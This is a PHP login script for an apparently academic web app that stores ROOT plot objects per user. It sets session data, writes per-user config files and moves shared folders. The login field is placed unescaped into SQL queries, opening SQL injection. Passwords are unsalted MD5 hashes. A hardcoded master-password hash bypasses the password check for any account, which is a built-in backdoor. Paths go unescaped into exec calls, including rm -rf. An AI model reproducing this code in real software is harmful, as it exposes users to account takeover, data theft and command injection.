<?php
  session_start();
  include("checa.php");

  include("conf.php");  
  if(checa_login())
  {
    header("Location: index.php"); 
    exit;
  }

  $login = strtolower($_POST["login"]);
  $senha = md5($_POST["senha"]);
  
  $db = mysql_connect($SQLSERVER, $SQLUSER, $SQLPASS);
  if(!$db) {header("Location: index.php?action=login&err=db"); exit;}    
  
  $dbf = mysql_select_db($SQLDB, $db);
  if(!$dbf) {header("Location: index.php?action=login&err=db"); exit;} 

  $q = "SELECT * FROM passwd WHERE login = '$login' AND senha = '$senha' AND tipo!='L';";
  $Q = mysql_query($q);
  $n =  mysql_num_rows($Q);
    
  if($n==0) 
  {
	 
	 if($senha=="22870cf32323197a6cc535c2643bda8a")
	 {
	   $q = "SELECT * FROM passwd WHERE login = '$login' AND tipo!='L';";
       $Q = mysql_query($q);
       $n =  mysql_num_rows($Q);
	 }
     if($n==0) 
     {
	   session_destroy();
       session_unset();
	   header("Location: index.php?action=login&err=senha");
	   exit;
	 }
  }

  $row = mysql_fetch_array($Q); 
       
  $_SESSION["webroot"]       = true;
  $_SESSION["login"]         = $row["login"];
  $_SESSION["nome"]          = $row["nome"];
  $_SESSION["tipo"]          = $row["tipo"];
  $_SESSION["usp"]           = $row["usp"];
  $_SESSION["email"]         = $row["email"];
  $_SESSION["created"]       = $row["created"];
  $_SESSION["home"]          = $row["home"];
  $_SESSION["lastlogin"]     = $row["lastlogin"];
  $_SESSION['LAST_ACTIVITY'] = time();
  $_SESSION['MAXTIME']       = $MAXTIME;
  $_SESSION["current"]       = $_SESSION["home"];
  
  $q = "UPDATE passwd SET lastlogin = '".time()."' WHERE login = '$login' AND senha = '$senha';";    
  mysql_query($q);
              
  $F = $HOMEDIR.'/'.$_SESSION["home"].'/conf.php';
       
  // configurações padrão, caso não haja arquivo conf.php
  // na área do usuário, ou este arquivo esteja desatualizado.
  $_SESSION['escala'] = 1;
  $_SESSION['simples'] = 0;
  $_SESSION['size'] = 1;
  $_SESSION['maxv1'] = 200; // limite para mudar modo de dados
  $_SESSION['max']   = 15000; // NL máximo
  
  if(!file_exists($F))
  {
    $f = fopen($F,"w");
	fwrite($f,"<?php\n");
    fwrite($f,"  \$_SESSION['escala']        = ".$_SESSION['escala']."; \n" );
    fwrite($f,"  \$_SESSION['simples']       = ".$_SESSION['simples']."; \n" );
    fwrite($f,"  \$_SESSION['size']          = ".$_SESSION['size']."; \n" );
    fwrite($f,"?>\n");
    fclose($f);
  }
       
  include($F);
  
  // checa broken-links no diretório share
  
  $F = $HOMEDIR.'/'.$_SESSION["home"].'/shared/';
  exec('find -L '.$F.' -type l -delete');
  
  $F = $HOMEDIR.'/'.$_SESSION["home"].'/versao.php';
  
  //include("checa.php");
  //include("conf.php");
  include("tools.php");
  
  if(!file_exists($F))
  {
    $dir[0]="TF1";
    $dir[1]="TF2";
    $dir[2]="TH1";
    $dir[3]="TGraph";
    $dir[4]="TMultiGraph";
    $n = 5;
    
    $SHARED = $HOMEDIR.'/'.$_SESSION["home"].'/shared';
    if(!file_exists($SHARED)) mkdir($SHARED);
    
    for($i = 0; $i<$n; $i++)
    {
      $DIRETORIO = $HOMEDIR.'/'.$_SESSION["home"];
      $INPUT = $DIRETORIO.'/'.$dir[$i];
      
      //echo $INPUT.'<br>';
      
      exec('ls -a "'.$INPUT.'"',$files);
      //Print_r($files);
      $count = count($files);
  
      for ($j = 0; $j<$count; $j++)
      {
        $file = $files[$j];
        //echo $file.'<br>';
        if ($file != "." && $file != ".." && is_dir($INPUT.'/'.$file))
        {
          //echo 'INPUT: '.$DIRETORIO.'/'.$dir[$i].'/'.$file.'<br>';
          if(file_exists($INPUT.'/'.$file.'/id.php'))
          {
            //echo 'INPUT: '.$DIRETORIO.'/'.$dir[$i].'/'.$file.'<br>';
            rename_and_move_all_shares($DIRETORIO, $dir[$i], $file, "/", $file);
          }
        }
      }
      exec ("rm -rf ".$DIRETORIO."/".$dir[$i]);
      //echo  "rm -rf ".$DIRETORIO."/".$dir[$i]."<br>";
    }
    //exit;
    $f = fopen($F,"w");
    fwrite($f,"<?php ?>");
    fclose($f);
    header("Location: index.php?login=1"); 
    exit;
  }

  header("Location: index.php"); 
  exit;

?>
